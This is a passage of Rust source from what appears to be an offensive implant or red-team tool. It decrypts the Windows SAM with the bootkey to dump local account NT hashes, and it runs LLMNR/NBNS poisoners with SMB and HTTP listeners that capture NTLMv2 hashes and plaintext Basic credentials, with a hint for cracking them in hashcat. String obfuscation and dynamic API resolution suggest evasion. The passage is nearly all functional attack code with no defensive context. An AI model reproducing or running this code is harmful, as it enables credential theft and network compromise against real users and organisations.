        let len = val.ve_valuelen as usize;
        if offset + len > buf_size as usize {
            return Err("value pointer out of range".into());
        }
        Ok(buf[offset..offset + len].to_vec())
    }

    fn hex_str(b: &[u8]) -> String { b.iter().map(|x| format!("{:02x}", x)).collect() }

    // Enable SeBackupPrivilege (ID 17) for elevated admin access to SAM
    unsafe {
        let mut was_enabled: u8 = 0;
        crate::dynapi::rtl_adjust_privilege(17, 1, 0, &mut was_enabled);
    }

    // ── Step 1: bootkey from SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data} class names
    let sys_key = reg_open(w::HKEY_LOCAL_MACHINE, "SYSTEM", w::KEY_READ)?;
    // Determine CurrentControlSet
    let select_key = reg_open(sys_key, "Select", w::KEY_QUERY_VALUE)?;
    let current_bytes = reg_read_value(select_key, "Current")?;
    reg_close(select_key);
    let cs_num = if current_bytes.len() >= 4 {
        u32::from_le_bytes([current_bytes[0], current_bytes[1], current_bytes[2], current_bytes[3]])
    } else { 1 };
    let cs_path = format!("ControlSet{:03}\\Control\\Lsa", cs_num);
    let lsa_key = reg_open(sys_key, &cs_path, w::KEY_READ)?;

    let mut boot_raw = Vec::with_capacity(16);
    for name in &[s!("JD"), s!("Skew1"), s!("GBG"), s!("Data")] {
        let sub = reg_open(lsa_key, name, w::KEY_READ)?;
        let class_hex = reg_query_class(sub)?;
        reg_close(sub);
        let bytes: Vec<u8> = (0..class_hex.len())
            .step_by(2)
            .filter_map(|i| u8::from_str_radix(&class_hex[i..i+2], 16).ok())
            .collect();
        boot_raw.extend_from_slice(&bytes);
    }
    reg_close(lsa_key);
    reg_close(sys_key);

    if boot_raw.len() < 16 { return Err("bootkey extraction failed — incomplete class data".into()); }
    let perm: [usize; 16] = [8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7];
    let mut bootkey = [0u8; 16];
    for i in 0..16 { bootkey[i] = boot_raw[perm[i]]; }

    // ── Step 2: read SAM\SAM\Domains\Account F value → derive hashed bootkey (syskey)
    let sam_root = reg_open(w::HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account",
        w::KEY_READ | w::KEY_ENUMERATE_SUB_KEYS)?;
    let f_val = reg_read_value(sam_root, "F")?;
    if f_val.len() < 0xA0 { reg_close(sam_root); return Err("SAM F value too short".into()); }

    let revision = f_val[0x68];
    let hashed_bootkey = if revision == 3 {
        // Win10+ AES-128-CBC
        let iv  = &f_val[0x78..0x88];
        let enc = &f_val[0x88..0xA0];
        _aes128_cbc_decrypt(&bootkey, iv, enc)?
    } else {
        // Legacy RC4: MD5(F[0x70..0x80] + AQWERTY + bootkey + ANUM) → RC4 key
        let aqwerty = sb!("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%");
        let anum    = sb!("0123456789012345678901234567890123456789");
        let mut md5_input = Vec::new();
        md5_input.extend_from_slice(&f_val[0x70..0x80]);
        md5_input.extend_from_slice(&aqwerty);
        md5_input.extend_from_slice(&bootkey);
        md5_input.extend_from_slice(&anum);
        let rc4_key = _md5(&md5_input);
        _rc4(&rc4_key, &f_val[0x80..0xA0])
    };
    if hashed_bootkey.len() < 16 { reg_close(sam_root); return Err("hashed bootkey derivation failed".into()); }
    let syskey = &hashed_bootkey[..16];

    // ── Step 3: enumerate users under SAM\SAM\Domains\Account\Users
    let users_key = reg_open(w::HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users",
        w::KEY_READ | w::KEY_ENUMERATE_SUB_KEYS)?;
    let mut results: Vec<(String, u32, String, String)> = Vec::new();
    let mut idx = 0u32;
    let empty_lm = s!("aad3b435b51404eeaad3b435b51404ee");
    loop {
        let mut name_buf = [0u16; 256];
        let mut name_len = 256u32;
        let r = unsafe {
            w::RegEnumKeyExW(users_key, idx, name_buf.as_mut_ptr(), &mut name_len,
                ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut())
        };
        if r != 0 { break; }
        idx += 1;
        let sub_name = String::from_utf16_lossy(&name_buf[..name_len as usize]);
        if sub_name == "Names" { continue; }
        let rid = match u32::from_str_radix(&sub_name, 16) {
            Ok(v) => v,
            Err(_) => continue,
        };

        let user_key_path = format!("SAM\\SAM\\Domains\\Account\\Users\\{}", sub_name);
        let user_key = match reg_open(w::HKEY_LOCAL_MACHINE, &user_key_path, w::KEY_READ) {
            Ok(k) => k,
            Err(_) => continue,
        };
        let v_data = match reg_read_value(user_key, "V") {
            Ok(d) => d,
            Err(_) => { reg_close(user_key); continue; }
        };
        reg_close(user_key);

        if v_data.len() < 0xCC + 4 { continue; }

        // Parse username from V value
        let name_off = u32::from_le_bytes([v_data[0x0C], v_data[0x0D], v_data[0x0E], v_data[0x0F]]) as usize + 0xCC;
        let name_len = u32::from_le_bytes([v_data[0x10], v_data[0x11], v_data[0x12], v_data[0x13]]) as usize;
        let username = if name_off + name_len <= v_data.len() && name_len > 0 {
            let raw = &v_data[name_off..name_off + name_len];
            let u16s: Vec<u16> = raw.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
            String::from_utf16_lossy(&u16s)
        } else { format!("RID_{}", rid) };

        // Parse NT hash location from V value
        let nt_off = u32::from_le_bytes([v_data[0xA8], v_data[0xA9], v_data[0xAA], v_data[0xAB]]) as usize + 0xCC;
        let nt_len = u32::from_le_bytes([v_data[0xAC], v_data[0xAD], v_data[0xAE], v_data[0xAF]]) as usize;

        if nt_len == 0 || nt_off + nt_len > v_data.len() {
            results.push((username, rid, empty_lm.to_string(), s!("31d6cfe0d16ae931b73c59d7e0c089c0")));
            continue;
        }

        let nt_block = &v_data[nt_off..nt_off + nt_len];

        let nt_hash = if nt_len >= 24 && nt_block.len() >= 24 {
            let nt_revision = if nt_len > 0 { nt_block[2] } else { 1 };
            if nt_revision == 2 && nt_len >= 56 {
                // AES-128-CBC encrypted (Win10+)
                let iv  = &nt_block[8..24];
                let enc = &nt_block[24..];
                match _aes128_cbc_decrypt(syskey, iv, enc) {
                    Ok(dec) => {
                        let raw = _des_decrypt_hash(&dec[..std::cmp::min(16, dec.len())], rid);
                        hex_str(&raw)
                    }
                    Err(_) => "????????????????????????????????".to_string(),
                }
            } else {
                // RC4 (legacy)
                let enc_hash = if nt_block.len() >= 20 { &nt_block[4..20] } else { nt_block };
                let mut hmac_input = Vec::new();
                hmac_input.extend_from_slice(syskey);
                hmac_input.extend_from_slice(&rid.to_le_bytes());
                let ntpw = sb!("NTPASSWORD");
                hmac_input.extend_from_slice(&ntpw);
                let rc4_key = _md5(&hmac_input);
                let dec = _rc4(&rc4_key, enc_hash);
                let raw = _des_decrypt_hash(&dec[..std::cmp::min(16, dec.len())], rid);
                hex_str(&raw)
            }
        } else {
            s!("31d6cfe0d16ae931b73c59d7e0c089c0")
        };

        results.push((username, rid, empty_lm.to_string(), nt_hash));
    }
    reg_close(users_key);
    reg_close(sam_root);
    Ok(results)
}

#[cfg(windows)]
fn _aes128_cbc_decrypt(key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
    use std::ptr;
    use crate::dynapi;
    let aes_id: Vec<u16> = s!("AES\0").encode_utf16().collect();
    let chain_mode: Vec<u16> = s!("ChainingMode\0").encode_utf16().collect();
    let cbc_val: Vec<u16> = s!("ChainingModeCBC\0").encode_utf16().collect();
    let mut alg: usize = 0;
    let r = unsafe { dynapi::bcrypt_open_algorithm_provider(&mut alg, aes_id.as_ptr(), ptr::null(), 0) };
    if r != 0 { return Err(format!("BCryptOpenAlgorithmProvider: 0x{:08x}", r)); }
    unsafe { dynapi::bcrypt_set_property(alg, chain_mode.as_ptr(), cbc_val.as_ptr() as *const u8,
        (cbc_val.len() * 2) as u32, 0); }
    let mut key_h: usize = 0;
    let r = unsafe { dynapi::bcrypt_generate_symmetric_key(alg, &mut key_h, ptr::null_mut(), 0,
        key.as_ptr(), key.len() as u32, 0) };
    if r != 0 { unsafe { dynapi::bcrypt_close_algorithm_provider(alg, 0); } return Err(format!("BCryptGenerateSymmetricKey: 0x{:08x}", r)); }
    let mut iv_copy = iv.to_vec();
    let mut out = vec![0u8; data.len() + 16];
    let mut out_len = 0u32;
    let r = unsafe { dynapi::bcrypt_decrypt(key_h, data.as_ptr(), data.len() as u32, ptr::null(),
        iv_copy.as_mut_ptr(), iv_copy.len() as u32,
        out.as_mut_ptr(), out.len() as u32, &mut out_len, 0) };
    unsafe { dynapi::bcrypt_destroy_key(key_h); dynapi::bcrypt_close_algorithm_provider(alg, 0); }
    if r != 0 { return Err(format!("BCryptDecrypt: 0x{:08x}", r)); }
    out.truncate(out_len as usize);
    Ok(out)
}

#[cfg(windows)]
fn _md5(data: &[u8]) -> Vec<u8> {
    use std::ptr;
    use crate::dynapi;
    let md5_id: Vec<u16> = s!("MD5\0").encode_utf16().collect();
    let mut alg: usize = 0;
    unsafe { dynapi::bcrypt_open_algorithm_provider(&mut alg, md5_id.as_ptr(), ptr::null(), 0); }
    let mut hash_h: usize = 0;
    unsafe { dynapi::bcrypt_create_hash(alg, &mut hash_h, ptr::null_mut(), 0, ptr::null(), 0, 0); }
    unsafe { dynapi::bcrypt_hash_data(hash_h, data.as_ptr(), data.len() as u32, 0); }
    let mut out = [0u8; 16];
    unsafe { dynapi::bcrypt_finish_hash(hash_h, out.as_mut_ptr(), 16, 0); }
    unsafe { dynapi::bcrypt_destroy_hash(hash_h); dynapi::bcrypt_close_algorithm_provider(alg, 0); }
    out.to_vec()
}

#[cfg(windows)]
fn _rc4(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut s: Vec<u8> = (0..=255u8).collect();
    let mut j: u8 = 0;
    for i in 0..256 {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }
    let mut out = vec![0u8; data.len()];
    let (mut i, mut j) = (0u8, 0u8);
    for (idx, &byte) in data.iter().enumerate() {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        out[idx] = byte ^ s[s[i as usize].wrapping_add(s[j as usize]) as usize];
    }
    out
}

#[cfg(windows)]
fn _des_decrypt_hash(enc: &[u8], rid: u32) -> Vec<u8> {
    if enc.len() < 16 { return enc.to_vec(); }
    let k1 = _rid_to_des_key(rid, 0);
    let k2 = _rid_to_des_key(rid, 1);
    let mut out = vec![0u8; 16];
    out[..8].copy_from_slice(&_des_ecb_decrypt(&k1, &enc[..8]));
    out[8..16].copy_from_slice(&_des_ecb_decrypt(&k2, &enc[8..16]));
    out
}

#[cfg(windows)]
fn _rid_to_des_key(rid: u32, n: u8) -> [u8; 8] {
    let r = rid.to_le_bytes();
    let s: [u8; 7] = if n == 0 {
        [r[0], r[1], r[2], r[3], r[0], r[1], r[2]]
    } else {
        [r[3], r[0], r[1], r[2], r[3], r[0], r[1]]
    };
    _expand_des_key(&s)
}

#[cfg(windows)]
fn _expand_des_key(s: &[u8; 7]) -> [u8; 8] {
    let mut k = [0u8; 8];
    k[0] = s[0] >> 1;
    k[1] = ((s[0] & 0x01) << 6) | (s[1] >> 2);
    k[2] = ((s[1] & 0x03) << 5) | (s[2] >> 3);
    k[3] = ((s[2] & 0x07) << 4) | (s[3] >> 4);
    k[4] = ((s[3] & 0x0F) << 3) | (s[4] >> 5);
    k[5] = ((s[4] & 0x1F) << 2) | (s[5] >> 6);
    k[6] = ((s[5] & 0x3F) << 1) | (s[6] >> 7);
    k[7] = s[6] & 0x7F;
    for b in &mut k { *b = (*b << 1) & 0xFE; }
    k
}

#[cfg(windows)]
fn _des_ecb_decrypt(key: &[u8; 8], data: &[u8]) -> Vec<u8> {
    use std::ptr;
    use crate::dynapi;
    let des_id: Vec<u16> = s!("DES\0").encode_utf16().collect();
    let chain_prop: Vec<u16> = s!("ChainingMode\0").encode_utf16().collect();
    let ecb_val: Vec<u16> = s!("ChainingModeECB\0").encode_utf16().collect();
    let mut alg: usize = 0;
    unsafe { dynapi::bcrypt_open_algorithm_provider(&mut alg, des_id.as_ptr(), ptr::null(), 0); }
    unsafe { dynapi::bcrypt_set_property(alg, chain_prop.as_ptr(), ecb_val.as_ptr() as *const u8,
        (ecb_val.len() * 2) as u32, 0); }
    let mut key_h: usize = 0;
    unsafe { dynapi::bcrypt_generate_symmetric_key(alg, &mut key_h, ptr::null_mut(), 0,
        key.as_ptr(), key.len() as u32, 0); }
    let mut out = vec![0u8; 8];
    let mut out_len = 0u32;
    unsafe { dynapi::bcrypt_decrypt(key_h, data.as_ptr(), data.len() as u32, ptr::null(),
        ptr::null_mut(), 0, out.as_mut_ptr(), 8, &mut out_len, 0); }
    unsafe { dynapi::bcrypt_destroy_key(key_h); dynapi::bcrypt_close_algorithm_provider(alg, 0); }
    out
}

// ══════════════════════════════════════════════════════════════════════════════
// § LISTEN — multi-protocol credential listeners (SMB / HTTP-NTLM)
// ══════════════════════════════════════════════════════════════════════════════

pub fn listen_start(port: u16, proto: &str) -> String {
    let proto = if proto.is_empty() || proto == "all" { "smb" } else { proto };
    let key = format!("{}:{}", proto, port);

    // Check for duplicate
    {
        let guard = LISTENERS.lock().unwrap();
        if guard.iter().any(|e| e.key == key) {
            return format!("[creds listen] {} already running", key);
        }
    }

    let stop_flag = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let hashes: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    let mut active: Vec<String> = Vec::new();
    let mut failed: Vec<String> = Vec::new();

    // Main protocol listener (TCP)
    let bind_addr = format!("0.0.0.0:{}", port);
    match std::net::TcpListener::bind(&bind_addr) {
        Ok(listener) => {
            listener.set_nonblocking(true).ok();
            let stop_tcp = stop_flag.clone();
            let hashes_ref = hashes.clone();
            match proto {
                "http-ntlm" => {
                    std::thread::spawn(move || { _http_ntlm_listener_loop(listener, stop_tcp, hashes_ref); });
                    active.push(format!("HTTP-NTLM:{}", port));
                }
                "http" => {
                    std::thread::spawn(move || { _http_basic_listener_loop(listener, stop_tcp, hashes_ref); });
                    active.push(format!("HTTP:{}", port));
                }
                _ => {
                    std::thread::spawn(move || { _smb_listener_loop(listener, stop_tcp, hashes_ref); });
                    active.push(format!("SMB:{}", port));
                }
            }
        }
        Err(e) => {
            failed.push(format!("{}:{} ({})", proto.to_uppercase(), port, e));
        }
    }

    if active.is_empty() {
        return format!("[creds listen] Failed to bind {}:{} — {}", proto, port, failed.join(", "));
    }

    // Add entry
    {
        let mut guard = LISTENERS.lock().unwrap();
        guard.push(ListenerEntry {
            key: key.clone(),
            port,
            proto: proto.to_string(),
            started: std::time::Instant::now(),
            stop: stop_flag,
            hashes,
        });
    }

    // Start poisoners if not already running
    _ensure_poisoners(&mut active, &mut failed);

    let mut msg = format!("[creds listen] Active: {}", active.join(" + "));
    if !failed.is_empty() {
        msg.push_str(&format!("\n  Skipped: {}", failed.join(", ")));
    }
    msg
}

/// Start LLMNR/NBNS poisoners if not already running.
fn _ensure_poisoners(active: &mut Vec<String>, failed: &mut Vec<String>) {
    let mut pguard = POISONER_STOP.lock().unwrap();
    if pguard.is_some() { return; } // Already running

    let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));

    let stop_llmnr = stop.clone();
    if std::net::UdpSocket::bind("0.0.0.0:5355").is_ok() {
        std::thread::spawn(move || { _llmnr_poisoner_loop(stop_llmnr); });
        active.push("LLMNR:5355".to_string());
    } else {
        failed.push("LLMNR:5355 (in use)".to_string());
    }

    let stop_nbns = stop.clone();
    if std::net::UdpSocket::bind("0.0.0.0:137").is_ok() {
        std::thread::spawn(move || { _nbns_poisoner_loop(stop_nbns); });
        active.push("NBNS:137".to_string());
    } else {
        failed.push("NBNS:137 (in use)".to_string());
    }

    *pguard = Some(stop);
}

/// Stop poisoners if no listeners remain.
fn _stop_poisoners_if_empty() {
    let guard = LISTENERS.lock().unwrap();
    if !guard.is_empty() { return; }
    drop(guard);
    let mut pguard = POISONER_STOP.lock().unwrap();
    if let Some(stop) = pguard.take() {
        stop.store(true, std::sync::atomic::Ordering::Relaxed);
    }
    LLMNR_RESPONSES.store(0, std::sync::atomic::Ordering::Relaxed);
    NBNS_RESPONSES.store(0, std::sync::atomic::Ordering::Relaxed);
}

pub fn listen_stop(spec: &str) -> String {
    if spec.is_empty() {
        // Stop ALL listeners + poisoners
        let mut guard = LISTENERS.lock().unwrap();
        if guard.is_empty() {
            return "[creds listen] No listeners running.".to_string();
        }
        let mut total_hashes = 0usize;
        for entry in guard.iter() {
            entry.stop.store(true, std::sync::atomic::Ordering::Relaxed);
            total_hashes += entry.hashes.lock().map(|h| h.len()).unwrap_or(0);
        }
        let count = guard.len();
        guard.clear();
        drop(guard);
        let mut pguard = POISONER_STOP.lock().unwrap();
        if let Some(stop) = pguard.take() {
            stop.store(true, std::sync::atomic::Ordering::Relaxed);
        }
        let llmnr = LLMNR_RESPONSES.swap(0, std::sync::atomic::Ordering::Relaxed);
        let nbns  = NBNS_RESPONSES.swap(0, std::sync::atomic::Ordering::Relaxed);
        format!("[creds listen] Stopped {} listener(s). {} credentials captured. Poisoned: {} LLMNR, {} NBNS.",
            count, total_hashes, llmnr, nbns)
    } else {
        // Stop a specific listener by key (e.g. "http:80")
        let mut guard = LISTENERS.lock().unwrap();
        let idx = guard.iter().position(|e| e.key == spec);
        match idx {
            Some(i) => {
                let entry = guard.remove(i);
                entry.stop.store(true, std::sync::atomic::Ordering::Relaxed);
                let n = entry.hashes.lock().map(|h| h.len()).unwrap_or(0);
                let elapsed = entry.started.elapsed();
                drop(guard);
                _stop_poisoners_if_empty();
                format!("[creds listen] Stopped {}. Was active for {}. {} credentials captured.",
                    spec, _fmt_duration(elapsed), n)
            }
            None => {
                let running: Vec<&str> = guard.iter().map(|e| e.key.as_str()).collect();
                if running.is_empty() {
                    "[creds listen] No listeners running.".to_string()
                } else {
                    format!("[creds listen] '{}' not found. Running: {}", spec, running.join(", "))
                }
            }
        }
    }
}

pub fn listen_dump() -> String {
    let guard = LISTENERS.lock().unwrap();
    if guard.is_empty() {
        return "[creds listen] No listeners running. Use '/creds listen start' first.".to_string();
    }

    let llmnr = LLMNR_RESPONSES.load(std::sync::atomic::Ordering::Relaxed);
    let nbns  = NBNS_RESPONSES.load(std::sync::atomic::Ordering::Relaxed);
    let mut out = String::new();
    let mut has_ntlm = false;

    for entry in guard.iter() {
        let elapsed = entry.started.elapsed();
        let hashes = entry.hashes.lock().unwrap();
        let label = entry.key.to_uppercase();

        if hashes.is_empty() {
            out.push_str(&format!("[{}] 0 credentials (active {})\n", label, _fmt_duration(elapsed)));
        } else {
            let basic_count = hashes.iter().filter(|h| h.starts_with("[HTTP-Basic]")).count();
            let ntlm_count = hashes.len() - basic_count;
            if ntlm_count > 0 { has_ntlm = true; }
            out.push_str(&format!("[{}] {} credentials (active {}) — {} NTLMv2 + {} Basic\n",
                label, hashes.len(), _fmt_duration(elapsed), ntlm_count, basic_count));
            for h in hashes.iter() {
                out.push_str("  ");
                out.push_str(h);
                out.push('\n');
            }
        }
    }

    out.push_str(&format!("\nPoisoned: {} LLMNR, {} NBNS responses", llmnr, nbns));
    if has_ntlm {
        out.push_str("\nNTLMv2 format: hashcat -m 5600");
    }
    out
}

// ══════════════════════════════════════════════════════════════════════════════
// § LLMNR POISONER — respond to multicast name queries with our IP
// ══════════════════════════════════════════════════════════════════════════════

fn _llmnr_poisoner_loop(stop: Arc<std::sync::atomic::AtomicBool>) {
    use std::net::{UdpSocket, Ipv4Addr};
    use std::time::Duration;

    // LLMNR multicast: 224.0.0.252 port 5355
    let sock = match UdpSocket::bind("0.0.0.0:5355") {
        Ok(s) => s,
        Err(_) => return, // Can't bind (already in use or no perms)
    };
    sock.set_read_timeout(Some(Duration::from_millis(500))).ok();
    // Join multicast group
    let multicast = Ipv4Addr::new(224, 0, 0, 252);
    let _ = sock.join_multicast_v4(&multicast, &Ipv4Addr::UNSPECIFIED);

    let local_ip = _get_local_ip_bytes();

    while !stop.load(std::sync::atomic::Ordering::Relaxed) {
        let mut buf = [0u8; 512];
        let (n, src) = match sock.recv_from(&mut buf) {
            Ok(r) => r,
            Err(_) => continue,
        };
        if n < 12 { continue; }

        // LLMNR query format: standard DNS-like header
        // Flags at bytes 2-3: QR=0 means query
        if buf[2] & 0x80 != 0 { continue; } // Skip responses
        let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
        if qdcount == 0 { continue; }

        // Parse the query name (starts at byte 12)
        let (name, name_end) = match _parse_dns_name(&buf[12..n]) {
            Some(r) => r,
            None => continue,
        };
        let name_end = name_end + 12;

        // Build response: same transaction ID, QR=1, answer with our IP
        let mut resp = Vec::with_capacity(n + 16);
        // Copy header — set QR=1 (response), ANCOUNT=1
        resp.extend_from_slice(&buf[..2]); // Transaction ID
        resp.push(0x80); resp.push(0x00);  // Flags: QR=1, no error
        resp.extend_from_slice(&buf[4..6]); // QDCOUNT (copy)
        resp.push(0x00); resp.push(0x01);   // ANCOUNT = 1
        resp.push(0x00); resp.push(0x00);   // NSCOUNT
        resp.push(0x00); resp.push(0x00);   // ARCOUNT
        // Copy question section
        resp.extend_from_slice(&buf[12..name_end + 4]); // name + type + class
        // Answer section: name pointer + type A + class IN + TTL + RDLEN + IP
        resp.push(0xC0); resp.push(0x0C);   // Name pointer to offset 12
        resp.push(0x00); resp.push(0x01);   // Type A
        resp.push(0x00); resp.push(0x01);   // Class IN
        resp.extend_from_slice(&30u32.to_be_bytes()); // TTL 30s
        resp.push(0x00); resp.push(0x04);   // RDLENGTH = 4
        resp.extend_from_slice(&local_ip);  // Our IP

        let _ = sock.send_to(&resp, src);

        // Update stats
        LLMNR_RESPONSES.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let _ = name; // used for future logging
    }
    let _ = sock.leave_multicast_v4(&multicast, &Ipv4Addr::UNSPECIFIED);
}

// ══════════════════════════════════════════════════════════════════════════════
// § NBNS POISONER — respond to NetBIOS name queries with our IP
// ══════════════════════════════════════════════════════════════════════════════

fn _nbns_poisoner_loop(stop: Arc<std::sync::atomic::AtomicBool>) {
    use std::net::UdpSocket;
    use std::time::Duration;

    // NBNS: UDP port 137
    let sock = match UdpSocket::bind("0.0.0.0:137") {
        Ok(s) => s,
        Err(_) => return, // Can't bind
    };
    sock.set_read_timeout(Some(Duration::from_millis(500))).ok();
    sock.set_broadcast(true).ok();

    let local_ip = _get_local_ip_bytes();

    while !stop.load(std::sync::atomic::Ordering::Relaxed) {
        let mut buf = [0u8; 512];
        let (n, src) = match sock.recv_from(&mut buf) {
            Ok(r) => r,
            Err(_) => continue,
        };
        if n < 50 { continue; }

        // NBNS header: same as DNS
        // Flags: byte 2-3, opcode in bits 11-14 of flags
        let flags = u16::from_be_bytes([buf[2], buf[3]]);
        let qr     = (flags >> 15) & 1;
        let opcode = (flags >> 11) & 0xF;
        if qr != 0 { continue; }  // Skip responses
        if opcode != 0 { continue; } // Only handle name queries (opcode 0)
        let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
        if qdcount == 0 { continue; }

        // NBNS name starts at byte 12: length-prefixed NetBIOS encoded name
        // Format: 0x20 (length=32) followed by 32 bytes of encoded name, then 0x00
        if buf[12] != 0x20 { continue; }
        if n < 12 + 1 + 32 + 1 + 4 { continue; } // name + null + type/class

        // Build NBNS positive name query response
        let mut resp = Vec::with_capacity(62);
        resp.extend_from_slice(&buf[..2]); // Transaction ID
        // Flags: QR=1, opcode=0, AA=1, TC=0, RD=1, RA=0, B=0, rcode=0
        resp.push(0x85); resp.push(0x00);
        resp.push(0x00); resp.push(0x00); // QDCOUNT = 0
        resp.push(0x00); resp.push(0x01); // ANCOUNT = 1
        resp.push(0x00); resp.push(0x00); // NSCOUNT
        resp.push(0x00); resp.push(0x00); // ARCOUNT
        // Answer: copy the name from the query (34 bytes: 0x20 + 32 encoded + 0x00)
        resp.extend_from_slice(&buf[12..12 + 34]);
        resp.push(0x00); resp.push(0x20); // Type: NB (0x0020)
        resp.push(0x00); resp.push(0x01); // Class: IN
        resp.extend_from_slice(&300u32.to_be_bytes()); // TTL 300s
        resp.push(0x00); resp.push(0x06); // RDLENGTH = 6
        // NB_FLAGS: B-node, unique
        resp.push(0x00); resp.push(0x00);
        resp.extend_from_slice(&local_ip); // Our IP

        let _ = sock.send_to(&resp, src);

        // Update stats
        NBNS_RESPONSES.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    }
}

// ── Poisoner helpers ─────────────────────────────────────────────────────────

/// Parse a DNS-style name from a buffer. Returns (name_string, bytes_consumed).
fn _parse_dns_name(data: &[u8]) -> Option<(String, usize)> {
    let mut name = String::new();
    let mut i = 0;
    loop {
        if i >= data.len() { return None; }
        let len = data[i] as usize;
        if len == 0 { i += 1; break; }
        if len >= 0xC0 { return None; } // Compression pointers not expected in queries
        i += 1;
        if i + len > data.len() { return None; }
        if !name.is_empty() { name.push('.'); }
        name.push_str(&String::from_utf8_lossy(&data[i..i + len]));
        i += len;
    }
    Some((name, i))
}

/// Get the local IPv4 address as 4 bytes for embedding in responses.
fn _get_local_ip_bytes() -> [u8; 4] {
    let ip_str = crate::sysinfo::local_ip();
    let parts: Vec<&str> = ip_str.split('.').collect();
    if parts.len() == 4 {
        let mut octets = [0u8; 4];
        for (i, p) in parts.iter().enumerate() {
            octets[i] = p.parse().unwrap_or(0);
        }
        octets
    } else {
        [127, 0, 0, 1]
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// § HTTP NTLM LISTENER — captures NTLMv2 via HTTP 401 + WWW-Authenticate
// ══════════════════════════════════════════════════════════════════════════════

fn _http_ntlm_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>) {
    use std::time::Duration;

    while !stop.load(std::sync::atomic::Ordering::Relaxed) {
        match listener.accept() {
            Ok((mut stream, addr)) => {
                stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
                stream.set_write_timeout(Some(Duration::from_secs(10))).ok();
                let peer = addr.ip().to_string();

                if let Some(cred) = _handle_http_ntlm_client(&mut stream, &peer) {
                    if let Ok(mut h) = hashes.lock() {
                        if !_is_dup_cred(&h, &cred) {
                            if h.len() >= LISTEN_MAX_HASHES { h.remove(0); }
                            h.push(cred);
                        }
                    }
                }
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(500));
            }
            Err(_) => {
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }
}

fn _http_basic_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>) {
    use std::time::Duration;

    while !stop.load(std::sync::atomic::Ordering::Relaxed) {
        match listener.accept() {
            Ok((mut stream, addr)) => {
                stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
                stream.set_write_timeout(Some(Duration::from_secs(10))).ok();
                let peer = addr.ip().to_string();

                if let Some(cred) = _handle_http_basic_only(&mut stream, &peer) {
                    if let Ok(mut h) = hashes.lock() {
                        if !_is_dup_cred(&h, &cred) {
                            if h.len() >= LISTEN_MAX_HASHES { h.remove(0); }
                            h.push(cred);
                        }
                    }
                }
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(500));
            }
            Err(_) => {
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }
}

/// Handle a single HTTP client — Basic-only mode (no NTLM). Captures plaintext credentials.
fn _handle_http_basic_only(stream: &mut std::net::TcpStream, peer: &str) -> Option<String> {
    let req = _http_read_request(stream)?;

    if let Some(cred) = _http_extract_basic(&req, peer) {
        _http_send_200(stream);
        return Some(cred);
    }

    // No auth → send 401 with Basic only (no NTLM header)
    _http_send_401_basic(stream)?;

    let req2 = _http_read_request(stream)?;
    if let Some(cred) = _http_extract_basic(&req2, peer) {
        _http_send_200(stream);
        return Some(cred);
    }

    None
}

/// Send HTTP 401 response advertising only Basic auth (no NTLM).
fn _http_send_401_basic(stream: &mut std::net::TcpStream) -> Option<()> {
    use std::io::Write;
    let body = "<html><body><h1>401 Unauthorized</h1></body></html>";
    let resp = format!(
        "HTTP/1.1 401 Unauthorized\r\n\
         WWW-Authenticate: Basic realm=\"Secured Area\"\r\n\
         Content-Type: text/html\r\n\
         Content-Length: {}\r\n\
         Connection: keep-alive\r\n\
         \r\n\
         {}",
        body.len(), body
    );
    stream.write_all(resp.as_bytes()).ok()?;
    stream.flush().ok()?;
    Some(())
}

/// Handle a single HTTP client — captures NTLMv2 hashes AND Basic auth credentials.
/// Advertises both NTLM and Basic; NTLM is preferred by Windows browsers.
fn _handle_http_ntlm_client(stream: &mut std::net::TcpStream, peer: &str) -> Option<String> {
    use std::io::{Read, Write};

    let challenge = _random_challenge();

    // Read first request
    let req1 = _http_read_request(stream)?;

    // Check for Basic auth first (some clients send it immediately)
    if let Some(cred) = _http_extract_basic(&req1, peer) {
        _http_send_200(stream);
        return Some(cred);
    }

    let auth1 = _http_extract_ntlm(&req1);

    match auth1 {
        None => {
            // Step 1: No auth → send 401 requesting NTLM + Basic
            _http_send_401(stream, None)?;

            // Read second request
            let req2 = _http_read_request(stream)?;

            // Check Basic auth (user entered creds in the prompt)
            if let Some(cred) = _http_extract_basic(&req2, peer) {
                _http_send_200(stream);
                return Some(cred);
            }

            // Otherwise expect NTLM Type1
            let type1_b64 = _http_extract_ntlm(&req2)?;
            let type1_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, type1_b64.trim()).ok()?;

            // Verify it's NTLMSSP NEGOTIATE (Type1)
            let ntlmssp_sig = sb!("NTLMSSP");
            if !type1_bytes.starts_with(&ntlmssp_sig) { return None; }
            if type1_bytes.len() < 12 { return None; }
